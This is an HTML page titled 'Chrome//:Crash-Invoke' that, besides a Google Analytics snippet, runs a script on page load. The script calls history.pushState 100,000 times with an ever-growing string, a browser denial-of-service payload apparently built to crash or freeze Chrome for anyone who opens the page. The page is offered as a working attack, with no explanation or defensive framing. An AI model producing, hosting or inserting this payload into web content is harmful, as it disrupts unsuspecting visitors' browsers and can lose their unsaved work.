<html>
  <head>
  
  </head>
  
  <body>
    <center>
      <h1>Chrome//:Crash-Invoke</h1>
    </center>
    
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js', 'ga');
      
      ga('create', 'UA-60737367-1', 'auto');
      ga('send', 'pageview');
    </script>
    <script>
      var total = "";
      for( var i = 0; i < 100000; i++ ) {
        total = total + i.toString();
        history.pushState(0,0, total );
      }
    </script>
  
  </body>
</html>
